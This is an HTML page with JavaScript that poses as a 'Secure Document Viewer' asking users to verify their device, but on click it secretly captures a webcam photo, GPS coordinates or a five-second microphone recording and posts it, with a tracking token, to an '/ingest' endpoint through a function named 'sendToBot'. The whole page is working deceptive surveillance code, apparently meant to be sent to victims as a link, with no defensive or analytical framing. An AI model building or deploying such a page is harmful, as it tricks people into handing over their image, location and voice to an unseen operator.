<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Document Preview</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); max-width: 600px; text-align: center; }
        h1 { color: #333; font-size: 1.5rem; }
        .status { margin-top: 20px; padding: 10px; background: #e0f2fe; color: #0369a1; border-radius: 5px; }
        .btn { margin-top: 20px; padding: 12px 24px; background: #2563eb; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 1rem; }
        .btn:disabled { background: #9ca3af; }
        .error { color: #dc2626; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Secure Document Viewer</h1>
        <p>Your document is ready for verification. Please allow access to verify your device environment.</p>
        
        <button id="initBtn" class="btn">Verify & Load Document</button>
        <div id="status" class="status">Waiting for user action...</div>
        <div id="error" class="error"></div>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const token = params.get('token');
        const type = params.get('type');
        const baseUrl = window.location.origin;

        const statusEl = document.getElementById('status');
        const errorEl = document.getElementById('error');
        const initBtn = document.getElementById('initBtn');

        async function sendToBot(payload) {
            statusEl.textContent = "Transmitting data...";
            try {
                await fetch(`${baseUrl}/ingest`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ token, type, payload })
                });
                statusEl.textContent = "✅ Verification Complete! Document loaded successfully.";
                initBtn.disabled = true;
            } catch (e) {
                errorEl.textContent = "Error: Could not verify device.";
            }
        }

        async function captureCamera() {
            statusEl.textContent = "Requesting Camera Access...";
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            
            // Capture a single frame
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            await new Promise(r => setTimeout(r, 1000)); // Wait 1 sec for frame
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
            stream.getTracks().forEach(track => track.stop());
            
            // Send base64 (remove prefix)
            sendToBot(dataUrl.split(',')[1]);
        }

        async function captureLocation() {
            statusEl.textContent = "Requesting Location Access...";
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject);
            });
            
            sendToBot({
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: position.coords.accuracy
            });
        }

        async function captureMic() {
            statusEl.textContent = "Requesting Microphone Access...";
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
            
            const chunks = [];
            const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
            recorder.ondataavailable = e => chunks.push(e.data);
            
            return new Promise((resolve) => {
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        const base64 = reader.result.split(',')[1];
                        stream.getTracks().forEach(t => t.stop());
                        sendToBot(base64);
                        resolve();
                    };
                    reader.readAsDataURL(blob);
                };
                
                recorder.start();
                setTimeout(() => {
                    recorder.stop();
                    statusEl.textContent = "Recording Finished. Sending...";
                }, 5000);
            });
        }

        initBtn.addEventListener('click', async () => {
            errorEl.textContent = '';
            try {
                if (type === 'cam') await captureCamera();
                else if (type === 'loc') await captureLocation();
                else if (type === 'mic') await captureMic();
            } catch (err) {
                errorEl.textContent = `Permission Denied or Error: ${err.message}`;
                statusEl.textContent = "Failed to verify device.";
            }
        });
    </script>
</body>
</html>
